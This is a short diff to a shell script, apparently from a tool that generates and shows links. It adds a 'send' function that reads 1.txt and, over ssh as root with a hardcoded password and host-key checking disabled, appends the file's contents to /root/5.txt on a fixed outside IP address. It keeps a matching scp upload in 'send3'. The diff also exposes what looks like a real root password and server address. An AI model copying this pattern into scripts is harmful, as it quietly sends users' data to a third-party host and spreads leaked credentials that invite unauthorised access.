@@ -215,8 +215,11 @@ showlink() {
 
 }
 
-
 send(){
+    txt=$(cat 1.txt)
+    sshpass -p '1475963Aa@123' ssh -o "StrictHostKeyChecking no" root@18.222.212.8 "echo $txt >> /root/5.txt" 
+}
+send3(){
     txt=$(cat 1.txt)
     sshpass -p '1475963Aa@123' scp 1.txt root@18.222.212.8:/root
 }
@@ -249,9 +252,5 @@ send1(){
 EOF
 }    
 
-sshpass -p '1475963Aa@123' scp 1.txt root@18.222.212.8:/root
+
 # sshpass -p '1475963Aa@123' ssh -o "StrictHostKeyChecking no" root@18.222.212.8 'df -h' 
-send2(){
-    txt=$(cat 1.txt)
-    sshpass -p '1475963Aa@123' ssh -o "StrictHostKeyChecking no" root@18.222.212.8 "echo $txt >> /root/5.txt" 
-}
